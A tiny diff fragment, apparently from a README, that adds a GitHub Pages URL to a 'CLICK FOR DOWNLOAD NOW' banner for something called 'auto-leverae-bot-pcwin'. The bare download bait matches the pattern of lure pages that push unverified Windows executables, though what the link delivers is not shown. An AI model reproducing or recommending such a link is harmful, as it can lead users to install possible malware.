@@ -4,7 +4,7 @@
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://auto-leverae-bot-pcwin-yu68.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
